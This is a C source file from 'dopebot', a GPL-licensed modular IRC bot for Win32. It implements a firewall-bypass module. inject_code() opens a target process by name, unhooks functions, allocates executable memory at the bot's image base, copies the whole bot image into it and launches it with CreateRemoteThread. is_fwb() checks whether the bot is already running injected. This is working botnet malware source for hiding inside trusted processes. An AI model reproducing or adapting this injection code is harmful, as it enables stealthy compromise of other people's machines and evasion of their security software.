/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_FWB
#include "bot.h"

//Inject Code
bool inject_code(char *szProcess, LPTHREAD_START_ROUTINE lpEntryPoint)
{

	DWORD dwSize, dwThread, dwWritten;
	HANDLE hProcess, hThread;
	LPVOID lpBuffer;
	PBYTE pbModule;
	if (is_os9x()) return FALSE;
	if (!is_osnt()) return FALSE;

#ifndef NO_DEBUG
		printf("[DEBUG] Injecting code, ínject_code()\n");
#endif

#ifndef NO_UNHOOK
		unhook_functions();
#endif

		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, get_pid(szProcess));
	if (hProcess == NULL) return FALSE;
		pbModule = (PBYTE)GetModuleHandle(0);
		dwSize = ((PIMAGE_NT_HEADERS)(pbModule+((PIMAGE_DOS_HEADER)pbModule)->e_lfanew))->OptionalHeader.SizeOfImage;
		VirtualFreeEx(hProcess, pbModule, 0, MEM_RELEASE);
		lpBuffer = VirtualAllocEx(hProcess, pbModule, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!lpBuffer) return FALSE;
	if (!WriteProcessMemory(hProcess, lpBuffer, pbModule, dwSize, &dwWritten)) return FALSE;
		hThread = CreateRemoteThread(hProcess, 0, 0, lpEntryPoint, pbModule, 0, &dwThread);
	if (!hThread) return FALSE;
		CloseHandle(hThread);
		CloseHandle(hProcess);
		return TRUE;
}

//Is Code FWBd?
bool is_fwb()
{
	char szFilePath[MAX_PATH];

#ifndef NO_DEBUG
		printf("[DEBUG] Checking if bot is injected, is_fwb()...\n");
#endif

		GetModuleFileName(GetModuleHandle(NULL), szFilePath, sizeof(szFilePath));
		PathStripPath(szFilePath);
	if (strcmp(szFilePath, filename) != 0) return TRUE;
		return FALSE;
}
#endif